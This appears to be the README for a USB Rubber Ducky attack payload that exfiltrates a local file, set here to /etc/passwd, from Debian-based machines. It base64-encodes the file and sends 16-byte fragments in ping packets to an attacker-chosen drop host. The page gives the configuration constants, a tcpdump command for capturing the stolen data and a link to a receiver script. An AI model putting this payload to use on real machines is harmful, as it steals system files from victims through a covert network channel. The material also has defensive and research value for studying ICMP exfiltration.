# ICMP Data Exfiltration

- Title:         ICMP Data Exfiltration
- Author:        TW-D
- Version:       1.0
- Targets:       Debian-Based Linux Distributions
- Category:      Exfiltration

## Description

Exfiltrates a local file from a target machine using the native "ping" utility.
The file is first converted to "Base64", then divided into 16-byte fragments.
The "ping" utility is then used to transmit the data to a receiving host.

__Note :__ *The "base64" and "ping" utilities are required.*

## Configuration

In the "payload.txt" file, replace the values of the following constants :

```

REM ---
REM USB Rubber Ducky label.
REM ---
DEFINE #RD_LABEL DUCKY

REM ---
REM Absolute path of the file to be exfiltrated.
REM ---
DEFINE #TARGET_FILE /etc/passwd

REM ---
REM IP address or domain receiving ICMP packets.
REM ---
DEFINE #DROP_HOST www.example.com

```

## Usage

I) At the root of the USB Rubber Ducky, copy the "payload.sh" file.

II) To receive data, you can use :

```
tcpdump -A --interface="<INTERFACE>" -l -n -q --snapshot-length=0 -t "icmp[icmptype] == 8"
```

> OR

https://github.com/TW-D/tcpdump_ICMP-Data-Exfiltration/blob/main/tcpdump_icmp-data-exfiltration.rb
